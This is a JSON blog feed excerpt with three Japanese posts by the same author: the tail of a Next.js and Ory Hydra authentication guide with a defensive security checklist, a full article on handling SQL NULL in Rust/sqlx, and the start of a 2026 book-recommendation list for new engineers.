（IDトークンからsubjectを取得して削除）  }  // 3. Cookieを削除してリダイレクト  const response = NextResponse.redirect(new URL(\\"/\\", request.url));  response.cookies.delete(\\"auth_token\\");  response.cookies.delete(\\"refresh_token\\");  return response;}RP-Initiated LogoutOpenID ConnectにはRP-Initiated Logout 1.0という仕様がある。この仕様では、Relying Party（クライアントアプリケーション）からOpenID Providerに対してログアウトを要求する方法が定義されている。Hydraはこれをサポートしている。www.ory.sh// Hydraのログアウトエンドポイントを使う方法const logoutUrl = new URL(`${process.env.HYDRA_PUBLIC_URL}/oauth2/sessions/logout`);logoutUrl.searchParams.set(\\"id_token_hint\\", idToken);logoutUrl.searchParams.set(\\"post_logout_redirect_uri\\", `${process.env.NEXT_PUBLIC_URL}/`);return NextResponse.redirect(logoutUrl);この方法だと、Hydraがログアウト処理を統括し、Login Providerの/logoutエンドポイントにリダイレクトしてくれる。トラブルシューティング：実際に遭遇した問題問題1：Cookie名の不一致症状：ログイン後、ダッシュボードでAPIデータが取得できない原因：コールバックで設定するCookie名と、各ページで読み取るCookie名が異なっていた// コールバックresponse.cookies.set(\\"auth_token\\", ...);// ダッシュボード（間違い）.find((row) => row.startsWith(\\"access_token=\\"))// 正しくは.find((row) => row.startsWith(\\"auth_token=\\"))教訓：Cookie名は定数として一箇所で定義し、全体で共有する。なぜこのミスが起きるのか。認証コードはコールバック処理から書き始め、ダッシュボードは後から書く。時間が空くと、最初に使った名前を忘れる。「書いた順番」と「読まれる順番」が異なるコードでは、定数化を最初に行うべきだ。// lib/constants.tsexport const AUTH_COOKIE_NAME = \\"auth_token\\";export const REFRESH_COOKIE_NAME = \\"refresh_token\\";問題2：APIパスの構造症状：APIリクエストが404を返す原因：テナントAPIのパスプレフィックスを間違えていた// 間違いfetch(\\"/api/v1/incidents\\")  // 404// 正しいfetch(\\"/api/v1/tenant/incidents\\")  // 200教訓：APIのベースパスはAPIクライアントクラスで管理するclass ApiClient {  private baseUrl = process.env.NEXT_PUBLIC_API_URL;  private tenantPath = \\"/api/v1/tenant\\";  async getIncidents() {    return this.request(`${this.tenantPath}/incidents`);  }}問題3：トークン期限切れ症状：しばらく操作しないとAPI呼び出しが失敗する原因：アクセストークンの有効期限（15分）が切れていた対策：リフレッシュトークンを使った自動更新async request<T>(path: string, options?: RequestInit): Promise<T> {  const response = await fetch(`${this.baseUrl}${path}`, {    ...options,    headers: {      ...options?.headers,      Authorization: `Bearer ${this.token}`,    },  });  if (response.status === 401) {    // トークンをリフレッシュして再試行    await this.refreshToken();    return this.request(path, options);  }  return response.json();}問題4：HydraのセッションとProviderのセッション症状：ログアウト後、再度ログインしようとすると認証画面をスキップしてしまう原因：Hydraのログインセッションが残っていたOry Hydraのドキュメントによると、HydraはLogin Providerでの認証成功を記憶している。skipフラグが立っている場合、ログイン画面をスキップする。これはSSO（シングルサインオン）の正しい動作だが、完全なログアウトを実装する際には注意が必要だ。// Login Provider側if login_request.skip {    // 既にセッションがあるのでスキップ    // Note: skip時はcontextが既に設定されているためNoneで良い    let completed = hydra.accept_login(&challenge, &login_request.subject, false, None).await?;    return Ok(Redirect::to(&completed.redirect_to));}完全なログアウトには、Hydraのセッションも削除する必要がある：// ログアウト時にHydraのセッションも削除await fetch(  `${process.env.HYDRA_ADMIN_URL}/admin/oauth2/auth/sessions/login?subject=${userId}`,  { method: \\"DELETE\\" });エラーハンドリングのパターンバックエンドから返されるエラーは統一された形式になっている：{  \\"error\\": \\"invalid_credentials\\",  \\"error_description\\": \\"The provided credentials are invalid\\",  \\"error_code\\": \\"AUTH_002\\"}フロントエンドではこれを適切に処理する：async request<T>(path: string, options?: RequestInit): Promise<T> {  const response = await fetch(`${this.baseUrl}${path}`, options);  if (!response.ok) {    const error = await response.json().catch(() => ({      error: \\"unknown_error\\",      error_description: \\"An unexpected error occurred\\",    }));    throw new ApiError(response.status, error);  }  return response.json();}class ApiError extends Error {  constructor(    public status: number,    public body: { error: string; error_description: string; error_code?: string }  ) {    super(body.error_description);  }}セキュリティチェックリスト実装後に確認すべき項目。これは完璧なリストではない——セキュリティに完璧はない——が、最低限チェックすべきポイントをまとめた。認証に関わるCookieの属性[ ] HttpOnly属性: XSSの緩和策。クライアントJSからアクセス不要なCookieには必ず設定[ ] SameSite属性: LaxもしくはStrictに設定。CSRF対策の基本。Laxの場合、GETリクエストで更新処理を行っていないか確認[ ] Secure属性: HTTPS通信でのみCookieが送られるように。本番環境では必須[ ] Domain属性: サブドメインへのCookie送信範囲を理解しているか。example.comのCookieがjobs.example.comにも送られる設定だと、他サブドメインの脆弱性がリスクになる[ ] Cookie Prefix: Cookie名を__Host-で始めると、Domain属性が空でないCookieの指定を無視してくれる（参考: Cookie Prefixのバイパス）blog.tokumaru.orgレスポンスヘッダ[ ] Strict-Transport-Security（HSTS）: ブラウザにHTTPS接続を強制。max-age=31536000; includeSubDomains; preload[ ] X-Frame-Options: DENYもしくはSAMEORIGINでクリックジャッキング対策。CSPのframe-ancestorsも検討[ ] X-Content-Type-Options: nosniffを指定。MIMEタイプスニッフィング攻撃を防ぐ認証フロー[ ] stateパラメータでCSRF対策している[ ] リフレッシュトークンはhttpOnlyで保護している[ ] アクセストークンの有効期限は短く設定している（15分推奨）[ ] ログアウト時にトークンを無効化している[ ] メールアドレスの列挙ができないこと: ログイン画面やパスワード再設定画面で「このメールアドレスは登録されていません」のようなエラーを出さない[ ] JWTの署名を検証している（バックエンド側）[ ] テナント分離がJWTベースで行われている[ ] 退会/メールアドレス変更などの重要操作で直前のログインを必須にしている: XSSやセッションハイジャック発生時の緩和策その他[ ] サードパーティCookieに依存していないこと（Chrome廃止予定）[ ] iOS SafariのITPによりローカルストレージやJSから保存したCookieは7日で消える可能性がある（未使用時）まとめNext.jsでOry Hydra認証を実装する際の要点：OAuth2フローの理解：認可コードフローの各ステップでフロントエンドが何をすべきか把握するID Token署名検証：JWKSを使って署名を検証し、issuer/audienceを確認するCookie管理：httpOnly, Secure, SameSiteの設定を用途に応じて選択するマルチテナント：JWTにテナント情報を含め、APIはトークンからテナントを識別するエラーハンドリング：OAuth2仕様に沿ったエラー形式を統一的に処理するログアウト：Hydraのセッションとフロントエンドのセッション両方を考慮する認証は「動いた」で終わりではない。Cookie名の不一致のような単純なミスから、セッション管理の複雑さまで、実際に動かして初めて見つかる問題が多い。結局のところ、OAuth2は「誰かが決めた仕様に従う」ゲームだ。RFCを読み、OWASPを読み、Hydraのドキュメントを読む。自分で発明する余地は少ない。でも、それでいい。認証のような重要な仕組みを自己流で作るのは、傲慢だと思う。セキュリティの歴史は「賢い人が作ったものを、もっと賢い攻撃者が破る」の繰り返しだ。OAuth 1.0のセッション固定攻撃、JWTのalg=none脆弱性——仕様を作った人たちでさえ、穴を見落とす。自分がその歴史に新たな失敗を加える必要はない。先人の知恵に乗っかり、その上で自分のシステムに合った判断をする。それが現実的なアプローチだ。前回のバックエンド実装でユーザー列挙攻撃を防ぐテストを書いたように、フロントエンドでも手動でのE2Eテストが重要だ。ログイン→操作→ログアウト→再ログイン。このサイクルを何度も試して、エッジケースを潰していく。次回は、Playwright MCPを使ったE2Eテストの自動化と、テストで発見したバグについて解説する。syu-m-5151.hatenablog.comこのブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。おわりに今日は社内で学生向けワークショップを担当した。終わった後、若い参加者が話しかけてきた。「ブログ読んでます」と言われた。嬉しかった。嬉しかったが、すぐに釘を刺した。「あまり憧れないでくださいね」と。憧れられるのがあまり得意ではない。偶像として崇拝されるのが苦手だし、偶像として振る舞って相手に応えるのも苦手だ。それに、ブログで良いこと言っている人に若いうちから憧れすぎるのは良くない。自分がそうだったのでよく分かる。10代の頃、文章が上手くて考え方が明快な技術ブロガーを見つけて、「この人みたいになりたい」と思った。記事を読み漁った。でも、その人が実際にどんなコードを書いているかは知らなかった。ブログは編集された「ハイライト」にすぎない。裏側の泥臭い試行錯誤、失敗、妥協は見えない。数年後にそれを知ったとき、ちょっとがっかりした。がっかりした自分にもがっかりした。若い技術者なら、現場に居る良い技術者に憧れてほしい。ブログを書く人ではなく。GitHubのコミット履歴を見てほしい。PRのレビューコメントを見てほしい。本番障害のポストモーテムを読んでほしい。そこに本当の技術者がいる。ブログの「正解」ではなく、コードの「試行錯誤」に学んでほしい。正直に言えば、フロントエンドでの認証実装は想像以上に複雑だった。3年前の自分に言いたい。「Next.jsで認証？OAuth2知ってるし、すぐできるでしょ」と思っていた過去の自分に。そうじゃない。Cookieの属性一つでセキュリティモデルが変わる。ID Tokenの署名検証を省略した瞬間、認証システムの意味がなくなる。OAuth2のフローは理解していたつもりだった。RFCも読んだ。でも、実際にNext.jsでCookieを扱い、ID Tokenの署名を検証し、マルチテナントのテナント分離を実装すると、「知っている」と「動かせる」の間には大きな溝があることを思い知らされた。RFCには「stateパラメータでCSRF対策」と書いてある。でも、実際にコードを書くと「stateはどこに保存する？」「検証はいつやる？」「不一致の場合のエラーメッセージは？」という判断が次々と必要になる。仕様書は「何をすべきか」は教えてくれるが、「どう実装すべきか」は教えてくれない。その溝を埋めるのは、結局、自分で書いて動かす経験しかない。特にhttpOnlyの判断には時間を使った。OWASPのベストプラクティスを読み、Auth0のガイドを読み、それでも「これで正しいのか」という不安は消えない。セキュリティに100%の正解はない。トレードオフを理解し、判断し、記録する。それしかできることはない。この記事を書いている人間も、悩みながら書いている。ブログに書かれている「正解」は、試行錯誤の結果を事後的に整理したものにすぎない。過程で何度も間違えている。それを知った上で、参考にしてもらえれば。なんか総じてとても疲れた。でも、まあ、悪くない一日だった。参考資料Ory HydraOry Hydra DocumentationOAuth2 Token EndpointLogin FlowLogout FlowOAuth2/OIDC仕様RFC 6749 - OAuth 2.0RFC 9700 - OAuth 2.0 Security Best Current PracticeOpenID Connect Core 1.0RP-Initiated Logout 1.0セキュリティガイドラインOWASP OAuth2 Cheat SheetOWASP Session Management Cheat SheetAuth0 Token StorageCurity JWT Best PracticesCookie属性CookieのDomain属性は指定しないが一番安全 - 徳丸氏によるCookie Domain属性の解説Cookie Prefixのバイパス - __Host-プレフィックスの重要性MDN: Set-Cookie - Cookie属性の公式リファレンスサードパーティCookieの廃止に向けた準備 - Chrome対応ガイドライブラリjose - JavaScript Object Signing and EncryptionNext.jsNext.js App RouterRoute HandlersMiddleware","isoDate":"2026-01-09T01:46:16.000Z","dateMiliSeconds":1767923176000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Fear of the Unknown：Rust/sqlxでNULLを制する6つのパターン","link":"https://syu-m-5151.hatenablog.com/entry/2026/01/08/092409","contentSnippet":"はじめにあるプロジェクトで、電話番号が未登録のユーザーを検索するコードをレビューしていた。WHERE phone = NULL——一見正しく見えるこのクエリは、常に0件を返していた。データは確実に存在する。クエリもシンプル。では何が問題なのか。答えはSQLの3値論理にあった。通常の比較演算はTRUEかFALSEを返すが、SQLにはUNKNOWN（不明）という第3の真偽値がある。NULLは「値が不明」を意味するため、NULL = NULLは「不明 = 不明」となり、結果もUNKNOWNになる。WHERE句はTRUEの行しか返さないから、UNKNOWNは暗黙にFALSE扱いされ、結果は常に0件になる。この問題は『SQLアンチパターン』で「Fear of the Unknown」として解説されている。本記事ではRust + sqlxでの実装パターンに焦点を当てる。SQLアンチパターン 第2版 ―データベースプログラミングで陥りがちな失敗とその対策作者:Bill Karwinオーム社Amazonこういう妄想の仕様と実際の仕様には違いがある。「おい、類推するな」というブログで書いたので時間がある時に読んでほしい。syu-m-5151.hatenablog.comsqlxの型マッピングRustにはOption<T>という型がある。これは「値があるかもしれないし、ないかもしれない」を表現する型だ。Some(値)が「値あり」、Noneが「値なし」を意味する。SQLのNULLに相当するのがこのNoneだ。let phone: Option<String> = Some(\\"090-1234-5678\\".to_string());  // 値ありlet phone: Option<String> = None;                                // 値なし（NULL相当）sqlxはPostgreSQLのNULLをこのOption<T>に自動マッピングする。 PostgreSQL  Rust (NULLable)  Rust (NOT NULL)  VARCHAR, TEXT  Option\\\\<String>  String  INTEGER  Option\\\\<i32>  i32  BIGINT  Option\\\\<i64>  i64  UUID  Option\\\\<Uuid>  Uuid  DECIMAL  Option\\\\<Decimal>  Decimal  TIMESTAMPTZ  Option\\\\<DateTime\\\\<Utc>>  DateTime\\\\<Utc> NULLableカラムをOption<T>以外にマッピングすると、NULLが返された時点で実行時エラーになる。私も一度やった。「NULLなんて来ないだろう」と思っていたカラムが、特定の条件でNULLを返し、深夜にSlackが鳴った。#[derive(Debug, sqlx::FromRow)]struct User {    id: Uuid,    email: String,              // NOT NULL → 必ず値がある    name: String,               // NOT NULL → 必ず値がある    phone: Option<String>,      // NULLable → Option型で「値があるかもしれないし、ないかもしれない」を表現    bio: Option<String>,        // NULLable → Noneが「値なし」、Some(\\"値\\")が「値あり」    created_at: DateTime<Utc>,  // NOT NULL → 必ず値がある}パターン1：検索フィルターでのNULL// NG: NoneがNULLにバインドされ、phone = NULLは常にUNKNOWN// query_as::<_, User>の説明://   ::<_, User> は戻り値の型を指定するRustの記法（turbofish構文）//   _ はデータベースの種類をコンパイラに推論させる部分//   User は「検索結果をUser構造体に変換して」という指定let users = sqlx::query_as::<_, User>(    \\"SELECT * FROM users WHERE phone = $1\\"  // $1はプレースホルダ（SQLインジェクション対策）).bind(&params.phone)  // bind()で$1に値を埋め込む。NoneはNULLになる.fetch_all(&pool)     // 全件取得.await?;              // 非同期処理の完了を待つ。?はエラー時に早期リターン// OK: 条件分岐でクエリを切り替える// match式: Option型の中身に応じて処理を分岐（switch文のようなもの）let users = match &params.phone {    Some(phone) => {  // Some(値): 値がある場合        sqlx::query_as::<_, User>(\\"SELECT * FROM users WHERE phone = $1\\")            .bind(phone)            .fetch_all(&pool)            .await?    }    None => {  // None: 値がない場合 → IS NULLを使う        sqlx::query_as::<_, User>(\\"SELECT * FROM users WHERE phone IS NULL\\")            .fetch_all(&pool)            .await?    }};// OK: IS NOT DISTINCT FROMで1クエリにまとめる（PostgreSQL固有）// NULLを普通の値として比較できる（NULL同士も「等しい」と判定）let users = sqlx::query_as::<_, User>(    \\"SELECT * FROM users WHERE phone IS NOT DISTINCT FROM $1\\").bind(&params.phone).fetch_all(&pool).await?;パターン2：COUNTの挙動// r#\\"...\\"# は生文字列リテラル（raw string literal）// 複数行のSQLを書きやすく、エスケープも不要な記法sqlx::query_as(    r#\\"    SELECT        COUNT(*) as total_users,                           -- 全行数（NULLを含む）        COUNT(coupon_code) as users_with_coupon,           -- NULLでない行数        COUNT(*) - COUNT(coupon_code) as users_without_coupon    FROM users    \\"#)空文字列とNULLが混在している場合は注意が必要。// NG: 空文字列のみマッチ、NULLはマッチしない\\"SELECT * FROM users WHERE coupon_code = \'\'\\"// OK: 両方を考慮\\"SELECT * FROM users WHERE coupon_code IS NULL OR coupon_code = \'\'\\"// OK: NULLIFで正規化\\"SELECT * FROM users WHERE NULLIF(coupon_code, \'\') IS NULL\\"パターン3：フォーム送信での空文字列フロントエンドから{ \\"phone\\": \\"\\" }が送られると、Option<String>ではSome(\\"\\")になる。データベースには空文字列が保存され、NULLにはならない。// Rustレイヤーで正規化// filter(): 条件を満たさない場合はNoneに変換するメソッド// |s| !s.is_empty() はクロージャ（無名関数）: sが空でなければtruelet phone = req.phone.filter(|s| !s.is_empty());  // Some(\\"\\") → None, Some(\\"090\\") → Some(\\"090\\")let bio = req.bio.filter(|s| !s.is_empty());sqlx::query(\\"UPDATE users SET phone = $1, bio = $2 WHERE id = $3\\")    .bind(&phone)  // NoneはNULLとしてバインドされる    .bind(&bio)    .bind(user_id)    .execute(&pool)  // execute(): SELECT以外のクエリ実行    .await?;// SQLレイヤーで正規化sqlx::query(    r#\\"    UPDATE users    SET phone = NULLIF(TRIM($1), \'\'),  -- TRIM: 空白除去, NULLIF: \'\'ならNULLに        bio = NULLIF(TRIM($2), \'\')    WHERE id = $3    \\"#)パターン4：LEFT JOINでのOption必須LEFT JOINは左側のテーブル（例: users）の全行を返す。右側のテーブル（例: orders）に一致する行がない場合、右側のカラムはすべてNULLで埋められる。だから注文がないユーザーの場合、o.created_atはNULLになり、MAX(o.created_at)の結果もNULLになる。// NG: 注文がないユーザーでMAX(o.created_at)がNULLになり、実行時エラーstruct UserWithLastOrder {    last_order_date: DateTime<Utc>,  // NULLを受け付けない型}// OK: Option<T>でNULLを許容するstruct UserWithLastOrder {    last_order_date: Option<DateTime<Utc>>,  // NULLならNone、値があればSome(値)}LEFT JOINや集約関数（MAX, AVG, SUM等）の結果は常にNULLになりうる。迷ったらOption<T>を使う。パターン5：NOT INの罠// NG: category_idがNULLの行は削除されないsqlx::query(    r#\\"    DELETE FROM products    WHERE category_id NOT IN (        SELECT id FROM categories WHERE active = true    )    \\"#)なぜNULLの行が削除されないのか。NOT INは内部でx <> 1 AND x <> 2 AND ...に展開される。ここでcategory_idがNULLだとどうなるか。NULL <> 1はUNKNOWNを返す。NULL <> 2もUNKNOWN。ANDの3値論理ではTRUE AND UNKNOWN = UNKNOWNだから、条件全体がUNKNOWNになる。WHERE句はTRUEの行しか処理しないため、NULLを含む行は削除対象から外れてしまう。// OK: NOT EXISTSを使う// NULLの行も正しく処理される（サブクエリが0行ならTRUE）sqlx::query(    r#\\"    DELETE FROM products p    WHERE NOT EXISTS (        SELECT 1 FROM categories c        WHERE c.id = p.category_id AND c.active = true    )    \\"#)パターン6：query_as!マクロこれまでのパターンで使っていたquery_as()は実行時に型チェックを行う。一方query_as!()はマクロで、コンパイル時にデータベースへ接続してスキーマを確認し、型の不整合をビルドエラーとして検出する。NULLになりうるカラムをOption<T>以外でマッピングしようとすると、実行前にエラーを発見できる。// NG: AVG(rating)はNULLを返す可能性があり、コンパイルエラーstruct ProductSummary {    average_rating: f64,  // f64はNULLを受け付けない}sqlx::query_as!(    ProductSummary,    \\"SELECT name, AVG(rating) as average_rating FROM products GROUP BY name\\")// コンパイルエラー: AVGの結果がNULLになりうるのにOption<f64>ではない// OK: Option<T>を使うstruct ProductSummary {    average_rating: Option<f64>,}// OK: COALESCEと\\"!\\"サフィックスでNOT NULLを保証sqlx::query_as!(    ProductSummary,    r#\\"    SELECT name,           COALESCE(AVG(rating), 0)::FLOAT8  -- NULLなら0、FLOAT8にキャスト           as \\"average_rating!\\"              -- \\"!\\"でNOT NULLを宣言    FROM products GROUP BY name    \\"#) サフィックス  意味  !  NOT NULLを強制（Option\\\\<T>ではなくT）  ?  NULLを許容（TではなくOption\\\\<T>） まとめ冒頭のWHERE phone = NULLは、WHERE phone IS NULLに書き換えて5分で解決した。3値論理を知っているかどうか——それだけの差だった。NULLの問題はバグではなく、SQLの仕様だ。Rust/sqlxでは以下を守れば大半の問題は防げる。NULLableカラムはOption<T>にマッピング= NULLではなくIS NULLを使うNOT INではなくNOT EXISTSを使う空文字列とNULLを混在させない迷ったらOption<T>を使う。後からOptionを外すのは簡単だが、NULLが返ってきたときのパニックを本番で見るのは心臓に悪い。そもそもNULLableカラムを減らす設計（NOT NULL制約のデフォルト化、別テーブルへの分離）も検討に値する。3値論理の詳細は『SQLアンチパターン』の「Fear of the Unknown」章を参照してほしいです。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。参考資料SQL Antipatterns - Fear of the UnknownPostgreSQL - Comparison Functionssqlx - Compile-time checked queries","isoDate":"2026-01-08T00:24:09.000Z","dateMiliSeconds":1767831849000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"AI時代に今からITエンジニアを目指す若者にオススメする10冊の本  2026年版","link":"https://syu-m-5151.hatenablog.com/entry/2026/01/07/103853","contentSnippet":"はじめにAIは、あなたが聞いたことにしか答えない。聞かなかったことは、永遠に教えてくれない。あなたが何を知らないのか、AIは知らない。2026年だ。AIに聞けば何でも教えてくれる。コードを書いてもらい、設計を相談し、ドキュメントを要約させる。便利だ。では、なぜ本を読むのか。300ページもある本を、最初から最後まで読む必要があるのか。本は違う。本は、聞いていないことを語りかけてくる。知らなかった世界を見せてくる。持っていなかった問いを、手渡してくる。「そんなこと、考えたこともなかった」。そういう瞬間が、本にはある。AIとの対話では、たぶん起きない。AIは効率的だ。知りたいことに、最短距離でたどり着ける。でも、最短距離で歩いていると、道の脇にあるものが見えない。著者が失敗した話、遠回りした話、「今思えば間違いだった」という告白。そういう「寄り道」が、不思議と頭に残る。正解は忘れる。でも、誰かの失敗談は覚えている。たぶん、人間の脳は感情を伴う記憶を優先的に保持するからだ。著者の後悔や苦労を読むとき、読者は追体験している。その感情が、記憶を定着させる。AIに「失敗談を教えて」と聞けば、一般化された失敗談が返ってくる。でも、それは「誰かの」失敗ではない。固有名詞のない失敗談には、感情が宿らない。もう1つ。若者や学生は、そもそも問いを持っていない。何を聞けばいいか分からない。だから、AIに質問もできない。何が分からないのかも分からない。本を読めと言われても、何を読めばいいか分からない。本屋の技術書コーナーに行けば、棚一面に並ぶ背表紙の圧に押しつぶされそうになる。結局、何も買わずに帰る。本は、そういう人に問いをくれる。「あ、これが分からなかったのか」。読み終わって初めて、自分が何を知らなかったのかが分かる。問いを持たない人間に、問いを渡す。それが、本にしかできないことなのだと思う。そういう人のために、10冊を選んだ。「若者にオススメ」と書いておきながら、自分もまだ若い方なのだと思う。少なくとも、将来の自分から見れば若い。ただ、激動の時代だ。技術だけ磨いていればいい時代は、終わりかけているのかもしれない。あるいは、もう終わっているのかもしれない。だから、技術以外の本も混ぜて紹介することにした。先に断っておく。私はバックエンドエンジニアやインフラエンジニアからキャリアをスタートさせた人間だ。だから、フロントエンドやネイティブアプリに関しては、ほぼ紹介しない。偏っている。偏っているが、自分が読んでいない領域の本を勧めることはできない。プログラミング言語個別の書籍も紹介しない。どの言語を学ぶかは人によって違う。だから、言語に依存しない本を中心に選んだ。この10冊が良い10冊かどうかは、分からない。私が良いと思った本が、誰にとっても良いとは限らない。だから、この記事を「正解」として読まなくていい。「こういう本があるんだな」という参考程度に。それでいいのだと思う。それから、もう1つ。本を買うお金がないなら、図書館で借りればいい。技術書は高い。1冊3000円、4000円は当たり前だ。まず読む。金は後でいい。読んで、良かったら、いつか買えばいい。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。では、本題に入る。技術の土台を作るまずは土台だ。プログラミングを始める前に、あるいは始めたばかりの頃に、IT業界で使われる言葉を知っておく必要がある。語彙がなければ、技術書も読めない。先輩の話も分からない。AIに質問もできない。1冊目：情報処理技術者試験の参考書（どれでもいい）1冊目から、いきなり「どれでもいい」と言うのは無責任に聞こえるかもしれない。でも、本当にそうなのだ。ITパスポートでも、基本情報技術者試験でも、応用情報技術者試験でも、高度試験でも。自分のレベルに合ったものを選べ。本屋で立ち読みして、7割くらい分かるやつを買え。分からなすぎると挫折する。簡単すぎると意味がない。誤解しないでほしい。資格を取れと言っているわけではない。「資格なんて意味ない」「資格より実務経験だ」——そういう声があるのは知っている。半分は正しい。資格を持っているだけでは、コードは1行も書けない。試験に受かっても、現場で即戦力にはなれない。それは分かっている。もっと言えば、試験に受からなくてもいい。俺は全然受からないのに優秀なソフトウェアエンジニアを死ぬほど知っている。資格の有無と実力は、必ずしも一致しない。でも、勉強するなら、頭に入った方がいいだろう。頭に入れるなら、試験を受けた方がいい。締め切りがあると、人は勉強する。試験日という締め切りがなければ、参考書は積読になる。金を払って申し込んで、日程を押さえて、会場に行く。その「仕組み」を使え。なぜ資格試験を勧めるのか。語彙が手に入るからだ。現場に出ると、専門用語が飛び交う。「スループットが落ちてる」「レイテンシがネックになってる」「冗長構成にしないと」「SLAどうする？」——こういう会話が、当たり前のように行われる。プログラミングはできるのに、この語彙がなくて会話に入れない。コードは書ける。でも、技術的な議論ができない。語彙がないと、会話にすら入れない。これは、よくある話だ。試験勉強を通じて、開発特有の語彙が頭に入る。ネットワーク、データベース、セキュリティ、プロジェクトマネジメント。知識として知っているだけで、会話の輪に入れる。「あ、それ試験で出たな」という感覚で、先輩の話が理解できる。試験の内容を全部覚えている必要はない。語彙が残ればいい。それだけで、現場での学習速度が全然違う。ここで正直に言う。実務経験の方が大事だというのは、その通りだと思う。本を読むより、コードを書いた方がいい。知識を詰め込むより、実際にシステムを動かした方がいい。2026年の今なら、分からないことはAIに聞けばいい。AIに疑問をぶつければ、理解も早く進む。でも、経験がなければ、疑問も生まれない。これは「経験を積め」という精神論ではない。構造の問題だ。語彙がなければ問いが立たず、問いがなければ経験を言語化できず、言語化できなければ次の学習に繋がらない。この悪循環を断ち切るには、どこかで語彙を入れるしかない。何を聞けばいいか分からなければ、AIも使いこなせない。「スループット」という言葉を知らなければ、「スループットが落ちている原因は何ですか」とは聞けない。「処理が遅い」と「スループットが低い」は、同じ現象を指しているように見えるが、後者の方が解決策にたどり着きやすい。なぜなら、「スループット」という言葉には、それを改善するための知識体系が紐づいているからだ。語彙は、学習の入り口だ。入り口がなければ、どんなに優秀なAIがあっても、中に入れない。IPA（情報処理推進機構）の試験は、日本のIT業界における共通言語を学ぶのに最も効率がいい。ネットワーク、データベース、セキュリティ、プロジェクトマネジメント、システム設計。全部、体系的にまとまっている。しかも、過去問が無料で公開されている。金がないなら、参考書すら買わなくていい。過去問だけで受かる人もいる。2026年度から、応用情報技術者試験や高度試験がCBT（Computer Based Testing）方式に移行する。これまで年2回、決まった日に会場に足を運ばなければならなかったのが、自分の都合に合わせて受験できるようになる。受験のハードルは確実に下がった。どの参考書がいいかは、正直、好みだ。キタミ式が好きな人もいれば、技術評論社の「合格教本」シリーズが好きな人もいる。Amazonのレビューを見て、自分に合いそうなのを選べばいい。図書館にあることも多い。もう1つ言っておく。ITに興味があるけど、プログラミングには興味がない。そういう若者は多いと思う。「エンジニアになりたいけど、コードを書くのはちょっと……」という人。そういう人こそ、まず資格を取れ。プログラミングができなくても、ITの世界で活躍する道はいくらでもある。インフラ、セキュリティ、プロジェクトマネジメント、ITコンサル。そのすべてにおいて、資格で得た知識と語彙は武器になる。繰り返す。資格を取ることが目的ではない。語彙を入れることが目的だ。語彙があれば、AIにも質問できる。語彙があれば、技術書も読める。語彙があれば、先輩の話も分かる。入り口を作れ。話はそれからだ。www.meti.go.jpシステムの基盤を理解するコードを書けるようになっても、それだけではシステムは動かない。サーバー、ネットワーク、データベース、OS。アプリケーションの下にあるレイヤーを理解しなければ、本番環境で動くものは作れない。ここでは、システムを支える基盤技術について学ぶ本を4冊紹介する。2冊目：バックエンドエンジニアのためのインフラ・クラウド大全コードを書けるようになった。アプリケーションが動くようになった。でも、本番環境にデプロイしようとすると、急に分からないことだらけになる。サーバーって何？ネットワークって何？クラウドって何？アプリだけ書けても、本番では動かせない。この本は、そのギャップを埋めてくれる。バックエンドエンジニアに求められるインフラ・クラウド領域の基礎知識が、1冊にまとまっている。情報システムの基礎から、可用性、キャパシティ、パフォーマンス、監視、セキュリティ、DevOps、SRE。現場で必要になる知識が、体系的に整理されている。全23章、544ページ。分厚いが、それだけの価値がある。「基礎知識」と聞くと、簡単そうに思えるかもしれない。でも、違う。基礎とは、簡単という意味ではない。基礎とは、すべての土台になるという意味だ。なぜこの混同が起きるのか。学校教育のせいだろう。教科書は「基礎→応用」の順に並んでいて、基礎は最初に習う、つまり簡単なものだと刷り込まれる。でも、実際には逆だ。基礎は最後に理解できる。応用を経験して初めて、基礎の意味が分かる。この本に書かれていることは、10年後も20年後も変わらない原則ばかりだ。最初は分からなくていい。分からないまま読み進めて、5年後に読み返したとき、「ああ、これはこういう意味だったのか」と分かる。それが基礎だ。構成も良い。分野ごとに解説がまとまっているが、章末で「あわせて読みたい」範囲が紹介されている。1つの章を読み終わると、「次はこっちも読んでみるか」となる。ちょっとだけ調べるつもりが1時間経っている。そういう本だ。クラウドネイティブな環境では、アプリケーションとインフラの境界が曖昧になっている。コンテナ、Kubernetes、オブザーバビリティ。これらを理解せずに、本番環境で動くシステムは作れない。「俺はアプリ側だから」では通用しない時代だ。この本は、その橋渡しをしてくれる。以前、自分が書いたアプリケーションを本番環境にデプロイしたとき、ローカルでは動いていたのに、本番では動かなかった。原因を調べるのに丸1日かかった。ネットワークの設定だった。そのとき、「アプリを書けるだけでは、本番では戦えない」と痛感した。この本があの頃の自分にあったら、もう少し早く原因にたどり着けたかもしれない。バックエンドエンジニアのためのインフラ・クラウド大全【リフロー型】作者:馬場 俊彰,株式会社X-Tech5翔泳社Amazon3冊目：SQLアンチパターン 第2版 ―データベースプログラミングで陥りがちな失敗とその対策データベースは、難しい。でも、難しいのに、簡単にできてしまう。ORMを使えば、SQLを書かなくてもデータを取得できる。CREATE TABLE文を書けば、テーブルが作れる。動く。動いてしまう。だから、問題に気づくのが遅れる。テーブル設計の失敗は、ソースコードの失敗よりもリファクタリングが難しい。データが入ってしまってからでは、修正のコストが跳ね上がる。だから、最初から正しい設計を知っておく必要がある。この本は、データベースプログラミングで陥りがちな失敗（アンチパターン）を体系的にまとめた本だ。カンマ区切りで値を格納する「ジェイウォーク」。外部キーを張らない「キーレスエントリ」。1つのカラムに複数の意味を持たせる「マルチカラムアトリビュート」。NULLの扱いを間違える「アンビギュアスグループ」。名前を聞いただけで「あ、やったことある」と思う人は多いはずだ。第2版では、新規書き下ろしの章と15のミニ・アンチパターンが加わった。特にミニ・アンチパターンは実務的な内容が多く、「自分もこの問題にハマった」「こうやって解決した」と思える内容が詰まっている。それなりにエンジニアをやっていると、多くのアンチパターンは踏んだことがある。でも、それを他者に体系的に伝えるのは難しい。自分の設計がシステムにどのような影響を与えていくかを経験として学習する機会は、意外と少ない。だからこそ、この本で先人の失敗を学んでおく価値がある。不思議なことがある。ベストプラクティスを調べて実装しても、想定通りにならないことが多い。環境が違う、前提が違う、規模が違う。でも、アンチパターンは違う。アンチパターンを実装すると、想定通りに困る。なぜか。アンチパターンは「制約違反」だからだ。リレーショナルデータベースには設計原則がある。その原則を破れば、必ず不整合やパフォーマンス問題が起きる。